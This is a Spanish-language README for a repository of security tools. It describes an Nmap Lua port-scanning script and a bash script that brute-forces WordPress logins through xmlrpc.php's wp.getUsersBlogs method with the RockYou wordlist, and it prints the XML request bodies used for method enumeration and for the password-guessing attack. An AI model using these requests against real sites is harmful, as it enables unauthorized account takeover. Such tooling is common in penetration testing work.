# Herramientas
Repositorio de scripts/herramientas para diversas funciones 

## Archivos

- **scan.nse:** Script básico para escaneo hecho en Lua para Nmap. Enumera puertos abiertos por TCP.
- **xmlrpc_bf:** Script en bash para enumerar credenciales válidas en Wordpress a través del archivo xmlrpc.php mediante fuerza bruta por medio del método "wp.getUsersBlogs".  Previamente hay que comprobar si dicho archivo está expuesto y el método está disponible y tener nombres de usuario potencialmente válidos. Para enumerar los métodos disponibles, se puede hacer una petición POST a dicho recurso mediante un archivo con una estructura XML como la siguiente:
  
```
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
Este script hace uso del diccionario Rockyou. La siguiente estructura es que la se usará para realizar el ataque:

```
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>user</value></param> 
<param><value>password</value></param> 
</params> 
</methodCall>
```
Si alguna contraseña coincide con el usuario dado se mostrará en la terminal.

